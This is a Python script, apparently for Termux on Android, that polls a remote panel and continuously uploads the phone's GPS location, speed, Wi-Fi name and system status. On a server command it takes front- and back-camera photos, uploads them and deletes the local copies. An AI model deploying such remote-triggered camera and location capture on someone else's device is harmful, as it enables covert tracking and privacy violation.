import time
import subprocess
import json
import requests
import os
import uuid
import base64
from datetime import datetime
from math import radians, sin, cos, sqrt, atan2

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_CAM = "https://nexos-panel.onrender.com/api/upload_camera"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_FOTO_FRONTAL = os.path.expanduser("~/nexos_frontal.jpg")
ARQUIVO_FOTO_TRASEIRA = os.path.expanduser("~/nexos_traseira.jpg")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*50)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*50 + "\n")

ultima_lat_valida = -16.6869
ultima_lon_valida = -49.2648
headers_json = {"Content-Type": "application/json"}
inicio_operacao = datetime.now()

def obter_temperatura():
    caminhos = [
        "/sys/class/thermal/thermal_zone0/temp",
        "/sys/class/hwmon/hwmon0/temp1_input"
    ]
    for caminho in caminhos:
        if os.path.exists(caminho):
            try:
                with open(caminho, 'r') as f:
                    temp = int(f.read().strip()) / 1000
                    return f"{temp:.1f}°C"
            except: pass
    return "N/A"

def obter_status_rede():
    wifi = run_command("termux-wifi-connectioninfo")
    if wifi:
        try:
            info = json.loads(wifi)
            if info.get("ssid"):
                return f"WiFi: {info['ssid']}"
        except: pass
    return "Dados Moveis"

def obter_ram():
    mem = run_command("free -h | grep Mem")
    if mem:
        parts = mem.split()
        if len(parts) >= 4:
            return f"{parts[3]} livres / {parts[1]} total"
    return "N/A"

def calcular_velocidade(lat1, lon1, lat2, lon2):
    if lat1 == lat2 and lon1 == lon2:
        return "0.0 km/h"
    
    R = 6371
    dlat = radians(lat2 - lat1)
    dlon = radians(lon2 - lon1)
    a = sin(dlat/2)**2 + cos(radians(lat1)) * cos(radians(lat2)) * sin(dlon/2)**2
    c = 2 * atan2(sqrt(a), sqrt(1-a))
    distancia = R * c
    velocidade = distancia * 3600
    return f"{velocidade:.1f} km/h"

def capturar_e_enviar_foto(numero_camera, tipo, arquivo_destino):
    print(f"📸 Tentando capturar camera {numero_camera} ({tipo})...")
    
    if os.path.exists(arquivo_destino):
        os.remove(arquivo_destino)
    
    cmd = f"termux-camera-photo -c {numero_camera} {arquivo_destino}"
    run_command(cmd)
    time.sleep(2)
    
    if os.path.exists(arquivo_destino) and os.path.getsize(arquivo_destino) > 0:
        try:
            with open(arquivo_destino, "rb") as img_file:
                foto_b64 = base64.b64encode(img_file.read()).decode('utf-8')
            
            payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
            
            response = requests.post(
                URL_UPLOAD_CAM,
                data=json.dumps(payload),
                headers=headers_json,
                timeout=15
            )
            
            if response.status_code == 200:
                print(f"🚀 -> Lente {tipo.upper()} enviada com sucesso!")
                return True
            else:
                print(f"❌ Erro no upload: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Erro ao processar foto {tipo}: {e}")
            return False
    else:
        print(f"❌ Arquivo nao foi criado: {arquivo_destino}")
        return False

lat_anterior = ultima_lat_valida
lon_anterior = ultima_lon_valida

while True:
    battery = "N/A"
    status_bat = "Desconhecido"
    temp_bat = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try:
            bat_data = json.loads(out_bat)
            battery = str(bat_data.get("percentage", "N/A"))
            status_bat = bat_data.get("status", "Desconhecido")
            temp_bat = str(bat_data.get("temperature", "N/A"))
        except: pass
    
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass
    
    lat, lon = ultima_lat_valida, ultima_lon_valida
    velocidade = "0.0 km/h"
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            if loc_data.get("latitude") and loc_data.get("longitude"):
                lat = loc_data.get("latitude")
                lon = loc_data.get("longitude")
                velocidade = calcular_velocidade(lat_anterior, lon_anterior, lat, lon)
                lat_anterior = lat
                lon_anterior = lon
                ultima_lat_valida = lat
                ultima_lon_valida = lon
        except: pass
    
    uptime = str(datetime.now() - inicio_operacao).split('.')[0]
    temperatura = obter_temperatura()
    rede = obter_status_rede()
    ram = obter_ram()
    
    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "battery_status": status_bat,
        "battery_temp": temp_bat,
        "storage": storage,
        "uptime": uptime,
        "lat": lat,
        "lon": lon,
        "speed": velocidade,
        "temperature": temperatura,
        "network": rede,
        "ram": ram,
        "timestamp": datetime.now().isoformat()
    }
    
    try:
        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=5)
        if response.status_code == 200:
            res_data = response.json()
            comando_cam = str(res_data.get("comando_cam", "wait")).lower()
            
            print(f"🛰️ [{datetime.now().strftime('%H:%M:%S')}] OK | Bat:{battery}% | Rede:{rede} | Vel:{velocidade}")
            print(f"   RAM:{ram} | Temp:{temperatura} | Up:{uptime}")
            
            if comando_cam == "take_dual":
                print("📸 [ACAO] CAPTURA DUPLA INICIADA...")
                sucesso_tras = capturar_e_enviar_foto(0, "back", ARQUIVO_FOTO_TRASEIRA)
                time.sleep(3)
                sucesso_front = capturar_e_enviar_foto(1, "front", ARQUIVO_FOTO_FRONTAL)
                
                for arquivo in [ARQUIVO_FOTO_FRONTAL, ARQUIVO_FOTO_TRASEIRA]:
                    if os.path.exists(arquivo): os.remove(arquivo)
                
                if sucesso_tras and sucesso_front:
                    print("🎯 [FIM] Captura dupla concluida com sucesso!")
                else:
                    print(f"⚠️ [FIM] Captura parcial - Frontal: {sucesso_front}, Traseira: {sucesso_tras}")
                    
    except Exception as e:
        print(f"⚠️ Alerta: {e}")
    
    time.sleep(2.0)
